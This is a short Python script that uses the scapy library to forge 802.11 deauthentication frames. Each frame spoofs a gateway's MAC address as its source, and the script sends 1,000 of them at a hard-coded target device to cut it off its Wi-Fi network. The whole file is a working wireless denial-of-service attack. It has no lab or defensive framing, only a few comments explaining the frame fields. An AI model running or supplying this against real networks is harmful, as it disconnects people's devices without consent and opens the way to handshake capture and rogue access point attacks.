from scapy.all import sendp  # , conf
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth

target_mac = "fe:27:5f:d2:a1:a3"
target_mac = "e6:a7:1b:3e:45:0F"
gateway_mac = "8c:53:c3:d8:1d:fc"

iface = "en0"
# 802.11 frame
# addr1: destination MAC - the one we want to deauth
# addr2: source MAC - we pretend to be the gw
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap() / dot11 / Dot11Deauth(reason=12)
# send the packet
# conf.use_pcap = True
sendp(packet, inter=0.1, count=1000, iface="en0", verbose=1)
